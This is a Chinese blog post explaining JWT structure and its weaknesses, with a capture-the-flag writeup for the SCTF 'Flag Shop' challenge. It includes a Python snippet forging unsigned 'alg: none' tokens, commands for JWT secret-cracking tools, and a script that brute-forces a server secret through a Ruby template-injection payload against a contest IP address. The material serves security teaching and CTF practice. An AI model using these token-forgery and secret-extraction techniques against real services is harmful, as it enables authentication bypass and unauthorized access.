<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>从SCTF看JWT安全  (附SCTF web writeup) - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="从SCTF看JWT安全  (附SCTF web writeup)" />
<meta property="og:description" content="原创作者：Fz41
这两天在打SCTF，有一题涉及到JWT的简单的知识，现在来把JWT相关的知识汇总一下,虽然不是主要的考察内容，但是作为一个基础知识，还是要掌握的。
JWT技术介绍 来源 用户认证的方式通常有两种，传统的session认证 和 基于token方式.
传统的session认证的缺陷 传统的session认证,随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.例如而随着认证用户的增多，服务端的开销会明显增大，这样在分布式的应用上，相应的限制了负载均衡器的能力，因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。
基于token的鉴权机制 基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。
定义 JWT(JSON Web Token) 是一个非常轻巧的规范，通过这个规范，可以传递可靠的安全信息，JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。
Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。
组成 一个字符串由头部，载荷，签名三部分组成。
头部(Header)
用于描述JWT的最基本的信息，其所用的签名与算法类似这样
{ &#34;typ&#34;: &#34;JWT&#34;, &#34;alg&#34;: &#34;HS256&#34; } 通过base64 编码之后，形成头部
载荷（Payload）
也是json形式的，官方定义的有如下六个部分
{ &#34;sub&#34;: &#34;1&#34;, //该JWT所面向的用户 &#34;iss&#34;: &#34;http://localhost:8000/auth/login&#34;, //该JWT的签发者 &#34;iat&#34;: , //iat(issued at): 在什么时候签发的token &#34;exp&#34;: , //exp(expires): token什么时候过期 &#34;nbf&#34;: , //nbf(not before)：token在此时间之前不能被接收处理 &#34;jti&#34;: &#34;&#34; //JWT ID为web token提供唯一标识 } 当然，开发者可以定义自己使用的数据。
以上json数据base64编码之后，形成载荷。
签名
将上面的两个编码后的字符串都用句号.连接在一起 提供一个密钥（secret）用头部所规定的算法加密就可以形成一个新的字符串" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/da870ef90eba1cba3c025686f2c35f59/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-03-30T14:19:10+08:00" />
<meta property="article:modified_time" content="2020-03-30T14:19:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">从SCTF看JWT安全  (附SCTF web writeup)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>原创作者：Fz41</p> 
<p>这两天在打SCTF，有一题涉及到JWT的简单的知识，现在来把JWT相关的知识汇总一下,虽然不是主要的考察内容，但是作为一个基础知识，还是要掌握的。</p> 
<h3><a id="JWT_4"></a>JWT技术介绍</h3> 
<h4><a id="_6"></a>来源</h4> 
<p>用户认证的方式通常有两种，传统的session认证 和 基于token方式.</p> 
<h5><a id="session_10"></a>传统的session认证的缺陷</h5> 
<p>传统的session认证,随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.例如而随着认证用户的增多，服务端的开销会明显增大，这样在分布式的应用上，相应的限制了负载均衡器的能力，因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p> 
<h5><a id="token_14"></a>基于token的鉴权机制</h5> 
<p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p> 
<h4><a id="_18"></a>定义</h4> 
<p>JWT(JSON Web Token) 是一个非常轻巧的规范，通过这个规范，可以传递可靠的安全信息，JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p> 
<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519" rel="nofollow">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p> 
<h4><a id="_26"></a>组成</h4> 
<p>一个字符串由头部，载荷，签名三部分组成。</p> 
<ol><li> <p>头部(Header)</p> <p>用于描述JWT的最基本的信息，其所用的签名与算法类似这样</p> <pre><code>{
  "typ": "JWT",
  "alg": "HS256"
}
</code></pre> <p>通过base64 编码之后，形成头部</p> </li><li> <p>载荷（Payload）</p> <p>也是json形式的，官方定义的有如下六个部分</p> <pre><code>{
    "sub": "1",  //该JWT所面向的用户
    "iss": "http://localhost:8000/auth/login",  //该JWT的签发者   
    "iat": , //iat(issued at): 在什么时候签发的token
    "exp": ,  //exp(expires): token什么时候过期
    "nbf": , //nbf(not before)：token在此时间之前不能被接收处理
    "jti": ""  //JWT ID为web token提供唯一标识
}
</code></pre> <p>当然，开发者可以定义自己使用的数据。</p> <p>以上json数据base64编码之后，形成载荷。</p> </li><li> <p>签名</p> <p>将上面的两个编码后的字符串都用句号.连接在一起 提供一个密钥（secret）用头部所规定的算法加密就可以形成一个新的字符串</p> <p>同样，需要base64编码</p> </li></ol> 
<p>以上将三个部分用<code>.</code>拼接在一起，就形成了一个完整的JWT令牌</p> 
<p>可上面介绍了那么多，大家依然不知道JWT到底是干嘛的，稍微介绍一下JWT的验证方式方式，大家应该就应该会对JWT的运用有所了解了</p> 
<p><strong>服务器应用在接受到JWT后，会首先对头部和载荷的内容用同一算法再次签名。如果服务器应用对头部和载荷再次以同样方法签名之后发现，自己计算出来的签名和接受到的签名不一样，那么就说明这个Token的内容被别人动过的，我们应该拒绝这个Token</strong></p> 
<h3><a id="JWT_76"></a>JWT安全问题分析</h3> 
<p>上面说了JWT的组成，我们的目的是研究其安全性既然这是一个验证的机制，那么安全问题主要就是非授权访问，也就是说要绕过这种验证机制，已知其结构，数据一般也是存在本地端，我们唯一不知道的就是加密算法的密钥，这样说来，有如下几种安全问题。</p> 
<h4><a id="none_80"></a>修改算法为none</h4> 
<p>修改算法有两种修改的方式其中一种就是将算法就该为none</p> 
<p>后端若是支持none算法</p> 
<p>header中的alg字段可被修改为none</p> 
<p>去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’） 然后直接提交到服务端去</p> 
<h4><a id="RS256HS256_90"></a>修改算法RS256为HS256</h4> 
<p>RS256是非对称加密算法，HS是对称加密算法</p> 
<p>如果jwt内部的函数支持的RS256算法，又同时支持HS256算法</p> 
<p>如果已知公钥的话，将算法改成HS256，然后后端就会用这个公钥当作密钥来加密</p> 
<h4><a id="_98"></a>信息泄露</h4> 
<p>JWT是以base64编码传输的，虽然密钥不可见，但是其数据记本上是明文传输的，如果传输了重要的内容，可以base64解码然后获取其重要的信息。</p> 
<h4><a id="_102"></a>爆破密钥</h4> 
<p>原理就是，如果密钥比较短的话，已知加密算法，通过暴力破解的方式，可以得到其密钥。</p> 
<h3><a id="_108"></a>漏洞环境搭建</h3> 
<p>搭建方式</p> 
<p>我搭建的环境为php7</p> 
<p>安装了composer</p> 
<p>直接用如下的命令进行搭建漏洞环境</p> 
<pre><code>git clone https://github.com/Sjord/jwtdemo/
cd jwtdemo
composer install
php -S 0.0.0.0:8000 -t public
</code></pre> 
<p>然后直接访问</p> 
<pre><code>127.0.0.1:8000/hs256.php
</code></pre> 
<p>环境就搭建成功了。</p> 
<p>payload如下</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">b64urlencode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> b64urlencode<span class="token punctuation">(</span><span class="token string">"{\"typ\":\"JWT\",\"alg\":\"none\"}"</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
    <span class="token string">'.'</span> <span class="token operator">+</span> b64urlencode<span class="token punctuation">(</span><span class="token string">"{\"data\":\"test\"}"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span>
</code></pre> 
<p>通过如上代码，可以构造任意的密钥为none的paylaod，从而绕过后端的检查，修改与RS256的方法与此类似，不再赘述。</p> 
<h3><a id="_146"></a>相关工具</h3> 
<h4><a id="JohnTheRipper_148"></a>JohnTheRipper</h4> 
<p>在爆破JWT的时候，可以用如下如下工具</p> 
<p><a href="https://github.com/magnumripper/JohnTheRipper">https://github.com/magnumripper/JohnTheRipper</a></p> 
<p>使用的方法如下</p> 
<pre><code>git clone https://github.com/magnumripper/JohnTheRipper
cd JohnTheRipper/src
./configure
make -s clean &amp;&amp; make -sj4
cd ../run
./john jwt.txt
</code></pre> 
<h4><a id="cjwtcracker_165"></a>c-jwt-cracker</h4> 
<p>C语言的破解工具</p> 
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p> 
<p>使用方法如下</p> 
<pre><code>make
make OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
</code></pre> 
<h3><a id="CTF_181"></a>相关CTF题目汇总</h3> 
<p>CTF基于这个安全问题也有多次的考察，最近的SCTF也有考察JWT相关知识点</p> 
<p>一下从网上找到了一些CTF writeup 大家可以参考一下</p> 
<h4><a id="JWT_token_187"></a>JWT token破解绕过</h4> 
<p><a href="https://delcoding.github.io/2018/03/jwt-bypass/" rel="nofollow">https://delcoding.github.io/2018/03/jwt-bypass/</a></p> 
<h4><a id="JWTcookie_191"></a>JWT伪造cookie</h4> 
<p><a href="https://www.jianshu.com/p/e64d96b4a54d" rel="nofollow">https://www.jianshu.com/p/e64d96b4a54d</a></p> 
<h4><a id="SCTF__Flag_Shop__writeup_195"></a>SCTF Flag Shop writeup</h4> 
<p>ruby的网站</p> 
<p>扫目录发现robots.txt里面有源码路径<br> http://47.110.15.101/filebak 有源码</p> 
<p>主要的漏洞点在</p> 
<pre><code>get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;").result
  end
end
</code></pre> 
<p>ruby的全局变量中 通过$~可以读取刚刚匹配的字串加上&lt;%=%&gt; 符合长度的要求，于是，可以通过这种方式来得到密钥</p> 
<p>爆破的脚本如下</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
dirc <span class="token operator">=</span> <span class="token string">'1234567890abcdef'</span>
url <span class="token operator">=</span> <span class="token string">'http://47.110.15.101/work'</span>
data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"&lt;%=$~%&gt;"</span><span class="token punctuation">,</span>
    <span class="token string">"do"</span><span class="token punctuation">:</span> <span class="token string">"&lt;%=$~%&gt; is working"</span>
<span class="token punctuation">}</span>
sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
sess<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Cookie'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIwZmQxMjUzNC1mMmJjLTRhZTUtOTRhNy1kNmUwZWRjMGJkMzEiLCJqa2wiOjEwN30.iI0fcdikWuFxSxYm9LV1dNjCmmID48QZ0c3w-hhyEnw'</span>

<span class="token comment">#后半部分</span>
key <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
        j <span class="token operator">=</span> key
        j <span class="token operator">+=</span> i
        data<span class="token punctuation">[</span><span class="token string">'SECRET'</span><span class="token punctuation">]</span> <span class="token operator">=</span> j
        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
        res <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> j <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            key <span class="token operator">+=</span> i
            <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<p>一共有两部分的密钥，同样的方法可以破解第二部分。</p> 
<p>得到密钥之后然后就是伪造了，有一个网站比较好用</p> 
<p><a href="https://jwt.io/" rel="nofollow">https://jwt.io/</a></p> 
<h3><a id="_262"></a>参考链接</h3> 
<p><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" rel="nofollow">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></p> 
<p><a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p> 
<p><a href="https://www.jianshu.com/p/576dbf44b2ae" rel="nofollow">https://www.jianshu.com/p/576dbf44b2ae</a></p> 
<p><a href="https://zhuanlan.zhihu.com/p/27722251" rel="nofollow">https://zhuanlan.zhihu.com/p/27722251</a></p> 
<p><a href="http://www.hetianlab.com/pages/CTFLaboratory.jsp" rel="nofollow">http://www.hetianlab.com/pages/CTFLaboratory.jsp</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/13f052a783ca94377246069c53efdad7/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">shell脚本-while循环猜价格</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/241e4e3a71d2cdf5003893121df8352d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">quartz(六)定时任务的暂停、关闭等操作说明</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>